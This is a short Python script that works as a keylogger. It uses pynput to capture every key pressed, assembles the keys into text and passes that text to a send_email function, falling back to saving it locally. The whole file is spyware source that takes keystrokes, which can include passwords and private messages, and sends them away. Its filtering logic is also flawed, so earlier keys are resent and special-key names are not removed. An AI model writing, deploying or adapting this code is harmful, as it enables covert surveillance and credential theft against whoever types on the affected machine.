from pynput.keyboard import Key, Listener
import send_email
import save_text
count = 0
keys = []

def on_press(key):
    print(key,end = " ")
    print("Pressed")
    global keys, count
    keys.append(str(key))
    count += 1
    if count > 10:
        count = 0
        record(keys)


def on_release(key):
    if key == Key.esc:
        return False


def record(keys):
    message = ""
    for key in keys:
        k = key.replace("'","")
        if key == "Key.space":
            k = " "
        elif key.find("Key")>0:
            k = ""
        message += k

    print(message)

    try:
        send_email.sendEmail(message)
    except:
        save_text.savText(message)



with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()
